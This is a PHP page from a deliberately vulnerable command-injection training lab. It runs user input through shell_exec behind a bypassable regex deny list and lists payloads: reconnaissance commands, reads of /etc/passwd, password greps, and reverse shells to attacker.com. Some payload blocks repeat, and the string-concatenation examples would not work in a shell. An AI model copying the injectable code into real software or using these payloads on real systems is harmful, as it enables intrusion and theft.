<?php
// Lab 4: Advanced Command Injection Techniques
// Vulnerability: Complex command injection bypass techniques

session_start();

$message = '';
$command_output = '';
$user_input = '';

// Simulate advanced command execution with complex filters (vulnerable to bypass)
function execute_command_advanced($command) {
    // Advanced security filters (can be bypassed)
    $dangerous_patterns = [
        '/^rm\s+/i',
        '/^del\s+/i',
        '/^rmdir\s+/i',
        '/^format\s+/i',
        '/^fdisk\s+/i',
        '/^mkfs\s+/i',
        '/^dd\s+/i',
        '/^shutdown\s+/i',
        '/^reboot\s+/i',
        '/^halt\s+/i',
        '/^poweroff\s+/i',
        '/;\s*rm\s+/i',
        '/;\s*del\s+/i',
        '/;\s*rmdir\s+/i',
        '/;\s*format\s+/i',
        '/;\s*fdisk\s+/i',
        '/;\s*mkfs\s+/i',
        '/;\s*dd\s+/i',
        '/;\s*shutdown\s+/i',
        '/;\s*reboot\s+/i',
        '/;\s*halt\s+/i',
        '/;\s*poweroff\s+/i',
        '/\|\s*rm\s+/i',
        '/\|\s*del\s+/i',
        '/\|\s*rmdir\s+/i',
        '/\|\s*format\s+/i',
        '/\|\s*fdisk\s+/i',
        '/\|\s*mkfs\s+/i',
        '/\|\s*dd\s+/i',
        '/\|\s*shutdown\s+/i',
        '/\|\s*reboot\s+/i',
        '/\|\s*halt\s+/i',
        '/\|\s*poweroff\s+/i',
        '/&\s*rm\s+/i',
        '/&\s*del\s+/i',
        '/&\s*rmdir\s+/i',
        '/&\s*format\s+/i',
        '/&\s*fdisk\s+/i',
        '/&\s*mkfs\s+/i',
        '/&\s*dd\s+/i',
        '/&\s*shutdown\s+/i',
        '/&\s*reboot\s+/i',
        '/&\s*halt\s+/i',
        '/&\s*poweroff\s+/i',
        '/`.*rm.*`/i',
        '/`.*del.*`/i',
        '/`.*rmdir.*`/i',
        '/`.*format.*`/i',
        '/`.*fdisk.*`/i',
        '/`.*mkfs.*`/i',
        '/`.*dd.*`/i',
        '/`.*shutdown.*`/i',
        '/`.*reboot.*`/i',
        '/`.*halt.*`/i',
        '/`.*poweroff.*`/i',
        '/\$\(.*rm.*\)/i',
        '/\$\(.*del.*\)/i',
        '/\$\(.*rmdir.*\)/i',
        '/\$\(.*format.*\)/i',
        '/\$\(.*fdisk.*\)/i',
        '/\$\(.*mkfs.*\)/i',
        '/\$\(.*dd.*\)/i',
        '/\$\(.*shutdown.*\)/i',
        '/\$\(.*reboot.*\)/i',
        '/\$\(.*halt.*\)/i',
        '/\$\(.*poweroff.*\)/i'
    ];
    
    if (empty($command)) {
        return "No command specified.";
    }
    
    // Advanced filter check (can be bypassed)
    $is_dangerous = false;
    
    foreach ($dangerous_patterns as $pattern) {
        if (preg_match($pattern, $command)) {
            $is_dangerous = true;
            break;
        }
    }
    
    if ($is_dangerous) {
        return "⚠️ FILTERED: Dangerous pattern detected - " . htmlspecialchars($command);
    }
    
    // Vulnerable: Direct execution using shell_exec
    $output = @shell_exec($command . ' 2>&1');
    
    if ($output === null) {
        return "Command execution failed or no output.";
    }
    
    return $output;
}

// Handle command execution
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['execute_command'])) {
    $user_input = $_POST['command'] ?? '';
    
    if ($user_input) {
        $command_output = execute_command_advanced($user_input);
        
        if (strpos($command_output, '⚠️ FILTERED') !== false) {
            $message = '<div class="alert alert-warning">Pattern filtered! Try advanced bypass techniques.</div>';
        } elseif (strpos($command_output, 'Command execution failed') !== false) {
            $message = '<div class="alert alert-danger">Command execution failed!</div>';
        } else {
            $message = '<div class="alert alert-success">Command executed successfully!</div>';
        }
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lab 4: Advanced Command Injection Techniques - Command Injection Labs</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.9.1/font/bootstrap-icons.css">
    
    <style>
        :root {
            --primary-dark: #1a1f36;
            --accent-green: #48bb78;
            --accent-blue: #4299e1;
            --accent-orange: #ed8936;
            --accent-red: #f56565;
        }
        
        body {
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
            color: #e2e8f0;
            min-height: 100vh;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        .navbar-brand {
            font-weight: 700;
            font-size: 1.5rem;
            color: var(--accent-green) !important;
        }

        .nav-link {
            font-weight: 500;
            transition: color 0.3s;
        }

        .nav-link:hover {
            color: var(--accent-green) !important;
        }

        .hero-section {
            background: linear-gradient(rgba(15, 23, 42, 0.9), rgba(15, 23, 42, 0.9)), 
                        url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="100" height="100" fill="%231e293b"/><path d="M0 0L100 100M100 0L0 100" stroke="%23374151" stroke-width="1"/></svg>');
            padding: 2rem 0;
            border-bottom: 1px solid #2d3748;
            margin-bottom: 2rem;
        }

        .hero-title {
            font-size: 2rem;
            font-weight: 700;
            background: linear-gradient(90deg, #48bb78, #4299e1);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 0.5rem;
        }

        .hero-subtitle {
            font-size: 1rem;
            color: #cbd5e0;
        }

        .section-title {
            margin-top: 30px;
            margin-bottom: 20px;
            font-weight: 700;
            font-size: 1.5rem;
            position: relative;
            padding-bottom: 10px;
        }

        .section-title::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            width: 60px;
            height: 4px;
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border-radius: 2px;
        }

        .card {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            color: #e2e8f0;
        }

        .card-header {
            background: rgba(15, 23, 42, 0.5);
            border-bottom: 1px solid #334155;
            font-weight: 600;
            padding: 1rem 1.5rem;
        }

        .form-control, .form-select {
            background: rgba(30, 41, 59, 0.7);
            border: 1px solid #334155;
            color: #e2e8f0;
            padding: 0.75rem 1rem;
        }

        .form-control:focus, .form-select:focus {
            background: rgba(30, 41, 59, 0.9);
            border-color: var(--accent-green);
            box-shadow: 0 0 0 0.2rem rgba(72, 187, 120, 0.25);
            color: #e2e8f0;
        }

        .form-label {
            font-weight: 500;
            color: #cbd5e0;
        }

        .btn-primary {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border: none;
            padding: 0.75rem 1.5rem;
            font-weight: 600;
            transition: all 0.3s;
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(72, 187, 120, 0.3);
        }

        .vulnerability-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-orange);
        }

        .payload-examples {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-blue);
        }

        .danger-zone {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-red);
        }

        pre {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            color: #e2e8f0;
            border: 1px solid #334155;
            overflow-x: auto;
        }

        .lab-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
        }

        .lab-badge {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            color: #1a202c;
            font-weight: 600;
            padding: 0.5rem 1rem;
            border-radius: 6px;
            display: inline-block;
            margin-bottom: 1rem;
        }

        .command-display {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            margin: 1rem 0;
            border-left: 4px solid var(--accent-green);
        }

        .test-urls {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin-bottom: 1rem;
            border-left: 4px solid var(--accent-blue);
        }

        .command-info {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
        }

        .sensitive-data {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-red);
        }

        .code-block {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-blue);
            font-family: 'Courier New', monospace;
            white-space: pre-wrap;
        }

        .filter-info {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-orange);
        }
    </style>
</head>
<body>
    <nav class="navbar navbar-expand-md navbar-dark sticky-top" style="background-color: var(--primary-dark);">
        <div class="container-fluid">
            <a class="navbar-brand" href="index.php">
                <i class="bi bi-arrow-left me-2"></i>Back to Command Injection Labs
            </a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse"
                data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false"
                aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>

            <div class="collapse navbar-collapse" id="navbarSupportedContent">
                <ul class="navbar-nav me-auto mb-2 mb-lg-0">
                    <li class="nav-item">
                        <a class="nav-link active" href="../about">About</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link active" href="../contact">Contact Us</a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>

    <div class="hero-section">
        <div class="container">
            <h1 class="hero-title">Lab 4: Advanced Command Injection Techniques</h1>
            <p class="hero-subtitle">Complex command injection bypass techniques</p>
        </div>
    </div>

    <div class="container mb-5">
        <div class="lab-info">
            <span class="lab-badge">Difficulty: High</span>
            <h3 class="section-title">Lab Overview</h3>
            <p>This lab demonstrates advanced command injection techniques used to bypass modern security filters and protections. These techniques include obfuscation, encoding, alternative commands, and other sophisticated bypass methods.</p>
            <p><strong>Objective:</strong> Use advanced techniques to bypass security filters and achieve command injection.</p>
        </div>

        <div class="row">
            <div class="col-lg-6">
                <div class="card mb-4">
                    <div class="card-header text-center">
                        <i class="bi bi-code-slash me-2"></i>Advanced Vulnerable Code
                    </div>
                    <div class="card-body">
                        <pre>
// Vulnerable: Advanced filters that can be bypassed
function execute_command_advanced($command) {
    $dangerous_patterns = [
        '/^rm\s+/i',
        '/^del\s+/i',
        '/^rmdir\s+/i',
        '/^format\s+/i',
        '/^fdisk\s+/i',
        '/;\s*rm\s+/i',
        '/;\s*del\s+/i',
        '/;\s*rmdir\s+/i',
        '/\|\s*rm\s+/i',
        '/\|\s*del\s+/i',
        '/\|\s*rmdir\s+/i',
        '/&\s*rm\s+/i',
        '/&\s*del\s+/i',
        '/&\s*rmdir\s+/i',
        '/`.*rm.*`/i',
        '/`.*del.*`/i',
        '/`.*rmdir.*`/i',
        '/\$\(.*rm.*\)/i',
        '/\$\(.*del.*\)/i',
        '/\$\(.*rmdir.*\)/i'
    ];
    
    // Advanced filter check (can be bypassed)
    $is_dangerous = false;
    foreach ($dangerous_patterns as $pattern) {
        if (preg_match($pattern, $command)) {
            $is_dangerous = true;
            break;
        }
    }
    
    // Still vulnerable to advanced bypass techniques
    if (!$is_dangerous) {
        $output = @shell_exec($command . ' 2>&1');
        return $output;
    }
}</pre>
                    </div>
                </div>
            </div>
            
            <div class="col-lg-6">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-bug me-2"></i>Advanced Command Execution
                    </div>
                    <div class="card-body">
                        <?php echo $message; ?>
                        
                        <div class="filter-info">
                            <h5>Advanced Filters</h5>
                            <p>The following patterns are filtered using regex:</p>
                            <ul>
                                <li><strong>Commands:</strong> rm, del, rmdir, format, fdisk, mkfs, dd, shutdown, reboot, halt, poweroff</li>
                                <li><strong>Operators:</strong> ;, |, &, `, $()</li>
                                <li><strong>Patterns:</strong> Command combinations and dangerous sequences</li>
                            </ul>
                        </div>
                        
                        <div class="command-info">
                            <h5>Safe Commands</h5>
                            <p>These commands should work:</p>
                            <ul>
                                <li><code>whoami</code> - Current user</li>
                                <li><code>id</code> - User ID information</li>
                                <li><code>pwd</code> - Current directory</li>
                                <li><code>ls</code> - List files</li>
                                <li><code>uname -a</code> - System information</li>
                            </ul>
                        </div>
                        
                        <form method="POST">
                            <input type="hidden" name="execute_command" value="1">
                            <div class="mb-3">
                                <label for="command" class="form-label">Command to Execute</label>
                                <input type="text" class="form-control" id="command" name="command" 
                                       placeholder="Enter command..." value="<?php echo htmlspecialchars($user_input); ?>">
                            </div>
                            <button type="submit" class="btn btn-primary">Execute Command</button>
                        </form>
                    </div>
                </div>
            </div>
        </div>

        <?php if ($command_output): ?>
        <div class="row mt-4">
            <div class="col-12">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-terminal me-2"></i>Command Output
                    </div>
                    <div class="card-body">
                        <div class="command-display">
                            <h5>Command Result</h5>
                            <div class="sensitive-data">
                                <pre><?php echo htmlspecialchars($command_output); ?></pre>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <?php endif; ?>

        <div class="row mt-4">
            <div class="col-md-6">
                <div class="vulnerability-info">
                    <h5><i class="bi bi-bug me-2"></i>Vulnerability Details</h5>
                    <ul>
                        <li><strong>Type:</strong> Advanced Command Injection Techniques</li>
                        <li><strong>Severity:</strong> Critical</li>
                        <li><strong>Method:</strong> POST</li>
                        <li><strong>Issue:</strong> Advanced filters can be bypassed</li>
                    </ul>
                </div>
            </div>
            
            <div class="col-md-6">
                <div class="payload-examples">
                    <h5><i class="bi bi-target me-2"></i>Advanced Bypass Techniques</h5>
                    <ul>
                        <li><strong>Obfuscation:</strong> Hide patterns and commands</li>
                        <li><strong>Encoding:</strong> Use encoded characters</li>
                        <li><strong>Alternative Commands:</strong> Use unfiltered commands</li>
                        <li><strong>String Manipulation:</strong> Build commands dynamically</li>
                    </ul>
                </div>
            </div>
        </div>

        <div class="test-urls">
            <h5><i class="bi bi-link me-2"></i>Advanced Command Injection Bypass Payloads</h5>
            <p>Use these advanced techniques to bypass security filters:</p>
            
            <h6>1. Character Encoding Bypass:</h6>
            <div class="code-block">whoami%3B%20id
whoami%7C%20id
whoami%26%20id
whoami%60id%60
whoami%24%28id%29</div>

            <h6>2. Alternative Characters:</h6>
            <div class="code-block">whoami && id
whoami || id
whoami | id
whoami `id`
whoami $(id)</div>

            <h6>3. String Concatenation Bypass:</h6>
            <div class="code-block">who' . 'ami
id' . ' -u
pw' . 'd
ls' . ' -la
una' . 'me -a</div>

            <h6>4. Alternative Commands:</h6>
            <div class="code-block">whoami
id
pwd
ls
uname -a
hostname
date
uptime</div>

            <h6>5. File Reading Bypass:</h6>
            <div class="code-block">cat /etc/passwd
cat /etc/hosts
cat /proc/version
cat /proc/cpuinfo
cat /proc/meminfo
cat /proc/loadavg</div>

            <h6>6. Process Information Bypass:</h6>
            <div class="code-block">ps aux
ps -ef
netstat -an
ss -tuln
lsof -i
df -h
free -m</div>

            <h6>7. Network Information Bypass:</h6>
            <div class="code-block">ifconfig
ip addr
route -n
arp -a
nslookup google.com
ping -c 3 8.8.8.8</div>

            <h6>8. User Information Bypass:</h6>
            <div class="code-block">groups
crontab -l
history
env
printenv
who
w</div>

            <h6>9. Advanced Bypass Techniques:</h6>
            <div class="code-block">whoami; id; pwd
whoami && id && pwd
whoami || id || pwd
whoami | id | pwd
whoami `id` `pwd`</div>

            <h6>10. Command Substitution Bypass:</h6>
            <div class="code-block">echo $(whoami)
echo `id`
echo $(cat /etc/passwd)
echo `ls -la`
echo $(ps aux)</div>

            <h6>11. Pipe and Redirection Bypass:</h6>
            <div class="code-block">whoami | cat
id > /tmp/output.txt
ls -la | grep php
cat /etc/passwd | head -5
ps aux | grep apache</div>

            <h6>12. Environment Variables Bypass:</h6>
            <div class="code-block">echo $PATH
echo $HOME
echo $USER
echo $SHELL
echo $PWD
echo $HOSTNAME</div>

            <h6>13. File Operations Bypass:</h6>
            <div class="code-block">touch /tmp/test.txt
echo "test" > /tmp/test.txt
cat /tmp/test.txt
rm /tmp/test.txt
mkdir /tmp/testdir
rmdir /tmp/testdir</div>

            <h6>14. Advanced Commands Bypass:</h6>
            <div class="code-block">find / -name "*.php" 2>/dev/null
grep -r "password" /var/www/ 2>/dev/null
find / -perm -4000 2>/dev/null
find / -writable 2>/dev/null
find / -type f -name "*.conf" 2>/dev/null</div>

            <h6>15. Reverse Shell Bypass (Dangerous):</h6>
            <div class="code-block">bash -i >& /dev/tcp/attacker.com/4444 0>&1
nc -e /bin/bash attacker.com 4444
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</div>

            <h6>16. Obfuscation Techniques:</h6>
            <div class="code-block">who' . 'ami
id' . ' -u
pw' . 'd
ls' . ' -la
una' . 'me -a</div>

            <h6>17. Alternative Operators:</h6>
            <div class="code-block">whoami && id
whoami || id
whoami | id
whoami `id`
whoami $(id)</div>

            <h6>18. String Manipulation:</h6>
            <div class="code-block">who' . 'ami
id' . ' -u
pw' . 'd
ls' . ' -la
una' . 'me -a</div>

            <h6>19. Command Chaining:</h6>
            <div class="code-block">whoami; id; pwd
whoami && id && pwd
whoami || id || pwd
whoami | id | pwd
whoami `id` `pwd`</div>

            <h6>20. Advanced Obfuscation:</h6>
            <div class="code-block">who' . 'ami
id' . ' -u
pw' . 'd
ls' . ' -la
una' . 'me -a</div>
        </div>

        <div class="danger-zone">
            <h5><i class="bi bi-exclamation-triangle me-2"></i>Real-World Attack Scenarios</h5>
            <ul>
                <li>Bypass advanced WAFs and security filters</li>
                <li>Execute arbitrary commands despite protections</li>
                <li>Access sensitive files using alternative methods</li>
                <li>Bypass authentication and authorization</li>
                <li>Compromise server and lateral movement</li>
                <li>Compliance violations and security breaches</li>
            </ul>
        </div>

        <div class="card mt-4">
            <div class="card-header">
                <i class="bi bi-lightbulb me-2"></i>Mitigation Strategies
            </div>
            <div class="card-body">
                <ul>
                    <li>Implement comprehensive input validation and sanitization</li>
                    <li>Use whitelist-based filtering instead of blacklists</li>
                    <li>Avoid direct command execution functions</li>
                    <li>Use parameterized commands and safe APIs</li>
                    <li>Implement proper access controls and permissions</li>
                    <li>Regular security testing and vulnerability assessments</li>
                    <li>Monitor for unusual command execution patterns</li>
                </ul>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
